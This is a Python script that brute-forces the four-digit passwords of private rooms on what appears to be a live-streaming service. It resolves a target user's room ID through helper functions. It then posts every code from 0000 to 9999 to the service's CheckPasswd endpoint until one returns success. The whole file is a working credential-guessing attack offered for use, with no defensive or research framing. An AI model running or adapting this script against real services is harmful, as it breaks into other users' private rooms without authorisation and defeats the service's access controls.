import time

import requests

# roomid -> password
from Util import getusernewno, getroomnum, searchroom, getproxies


def checkpass(room_id):
    url = "http://soagw.pw.szcsckj.com/xllive.service.pwroominfo/v1/CheckPasswd"
    proxies = getproxies()
    for i in range(10000):
        password = str(i).zfill(4)
        # print(password)
        payload = "{\"room_id\":\"" + room_id + "\",\"password\":\"" + password + "\"}"
        headers = {
            'Content-Type': "text/plain",
            'Connection': 'close',
            'Accept': "*/*",
            'Host': "soagw.pw.szcsckj.com",
            'Accept-Encoding': "gzip, deflate"
        }

        response = requests.request("POST", url, data=payload, headers=headers)
        if 'success' in response.text:
            return password


if __name__ == '__main__':
    start = time.time()
    usernewno = getusernewno('1607139558')
    # print(usernewno)
    # userinfo = getuserinfo(usernewno)
    # print('current_coin : ' + userinfo['data']['user_info']['current_coin'])
    # print('used_coin : ' + userinfo['data']['user_info']['used_coin'])
    # print('channel : ' + userinfo['data']['user_info']['channel'])
    roomnum = getroomnum(usernewno)
    # print(roomnum)
    roomid = searchroom(roomnum)
    # print(roomid)
    password = checkpass(roomid)
    print(password)

    end = time.time()
    print('take %s seconds' % (end - start))
